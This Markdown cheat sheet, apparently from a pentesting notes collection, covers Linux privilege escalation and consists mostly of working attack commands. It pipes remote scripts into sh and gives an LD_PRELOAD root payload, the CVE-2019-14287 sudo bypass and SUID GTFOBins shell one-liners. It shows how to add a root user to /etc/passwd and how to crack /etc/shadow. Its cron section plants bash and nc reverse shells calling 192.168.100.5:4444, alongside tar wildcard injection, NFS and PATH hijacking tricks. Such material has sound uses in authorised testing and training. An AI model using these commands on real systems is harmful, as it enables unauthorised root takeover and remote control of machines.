# 04 - Linux Privilege Escalation

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Automated Enumeration Scripts

Always begin post-exploitation by running trusted audit scripts to highlight common low-hanging fruit.

```bash
# Execute LinPEAS directly from memory (no disk footprint)
curl -L http://192.168.100.5/linpeas.sh | sh

# Linux Smart Enumeration (lse) - Level 0 shows only high-confidence vectors
curl -L http://192.168.100.5/lse.sh | bash -s -- -l 0

# Monitoring background processes and short-lived cron jobs (pspy)
chmod +x pspy64
./pspy64 -pf -i 1000
```

---

## 🔍 2. Manual System Audit Checklist

Do not rely solely on automated scripts. Run these essential manual commands:

```bash
# Identity and group memberships (Look for: sudo, lxd, docker, disk)
id
whoami
groups

# Kernel version and architecture
uname -a
cat /etc/os-release

# Environment variables (Check for secrets or LD_PRELOAD hints)
env

# Sudo permissions
sudo -l

# Active network connections and local internal listening ports
ss -tulnp
netstat -antup 2>/dev/null

# Processes running as root
ps aux | grep root

# Review mounted filesystems and NFS configurations
cat /etc/fstab
cat /etc/exports 2>/dev/null
```

---

## 🔑 3. Sudo Rights Misconfigurations

### 1. Inspecting Sudo Privileges
```bash
sudo -l
```

### 2. Sudo LD_PRELOAD Privilege Escalation
If `sudo -l` reveals `env_keep += LD_PRELOAD`:
1. Create a malicious shared object payload in `/tmp/exploit.c`:
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   #include <unistd.h>

   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       system("/bin/bash");
   }
   ```
2. Compile as a shared library:
   ```bash
   gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
   ```
3. Execute any allowed sudo binary with the preload directive:
   ```bash
   sudo LD_PRELOAD=/tmp/exploit.so <ALLOWED_COMMAND>
   ```

### 3. Sudo User ID Bypass (CVE-2019-14287)
If `sudo -l` allows execution as `(ALL, !root)`:
```bash
sudo -u#-1 /bin/bash
```

---

## ⚙️ 4. SUID / SGID Binaries & GTFOBins

Locate all binaries with the SUID bit set:
```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -perm -u=s -type f 2>/dev/null
```

### Common SUID GTFOBins Exploitation One-Liners:

| Binary | Exploitation Command |
|---|---|
| `bash` | `/usr/bin/bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `nano` | Run `nano`, press `Ctrl+R`, then `Ctrl+X`, type `reset; sh 1>&0 2>&0` |
| `cp` | Overwrite `/etc/passwd` or copy `/etc/shadow` |
| `env` | `env /bin/sh -p` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `php` | `php -r "pcntl_exec('/bin/sh', ['-p']);"` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |

---

## 🔒 5. Insecure File Permissions

### 1. Writable `/etc/passwd`
If `/etc/passwd` is world-writable (`-rw-rw-rw-`):
1. Generate an MD5-crypt password hash for password `password123`:
   ```bash
   openssl passwd -1 -salt evil password123
   # Output: $1$evil$T7u29...
   ```
2. Append a new root user (`toor`) to `/etc/passwd`:
   ```bash
   echo 'toor:$1$evil$T7u29...:0:0:root:/root:/bin/bash' >> /etc/passwd
   ```
3. Switch user to your newly created root account:
   ```bash
   su toor
   ```

### 2. Readable `/etc/shadow`
If `/etc/shadow` is world-readable:
1. Extract password hashes and format for Hashcat:
   ```text
   root:$6$aB1...:18290:0:99999:7:::
   ```
2. Crack offline using Hashcat:
   ```bash
   hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
   ```

---

## 🕒 6. Scheduled Tasks (Cron Jobs & Systemd)

### 1. Locating Scheduled Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

### 2. Writable Cron Script Exploitation
If a root-owned cron job executes a script that you can edit (e.g., `/opt/backup.sh`):
```bash
echo "bash -i >& /dev/tcp/192.168.100.5/4444 0>&1" >> /opt/backup.sh
```

### 3. Tar Wildcard Injection
If a cron job executes `tar *` inside a directory:
```bash
# In the directory where tar runs:
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.5 4444 >/tmp/f" > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

---

## 🛡️ 7. Linux Capabilities

Capabilities grant specific root privileges to binaries without granting full root SUID status.

```bash
# Discover binaries with capabilities
getcap -r / 2>/dev/null
```

### Exploiting Dangerous Capabilities:
- **`cap_setuid+ep` on Python**:
  ```bash
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
- **`cap_setuid+ep` on Perl**:
  ```bash
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  ```
- **`cap_dac_read_search+ep` on Tar / Custom binary**:
  Allows reading sensitive files (e.g., `/etc/shadow` or private SSH keys) regardless of permissions.

---

## 📂 8. NFS Root Squashing (`no_root_squash`)

If `/etc/exports` contains `no_root_squash` on an exported share:
```text
/shared_folder *(rw,sync,no_root_squash)
```

### Exploitation Steps:
1. Mount the share on your Kali machine:
   ```bash
   sudo mount -t nfs 192.168.100.15:/shared_folder /mnt/target_nfs -o nolock
   ```
2. On Kali (as `root`), copy `/bin/bash` into the mount and set the SUID bit:
   ```bash
   cp /bin/bash /mnt/target_nfs/rootbash
   chmod +s /mnt/target_nfs/rootbash
   ```
3. Return to your low-privilege shell on the target system and execute:
   ```bash
   /shared_folder/rootbash -p
   # Gained root shell!
   ```

---

## 🛤️ 9. Shared Library & PATH Hijacking

### PATH Hijacking
If a custom SUID binary calls a program without specifying the full path (e.g., executing `service apache2 status` instead of `/usr/sbin/service`):
```bash
# Check strings of the binary
strings /usr/local/bin/custom_suid | grep service

# Exploit by prepending /tmp to PATH
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/custom_suid
```
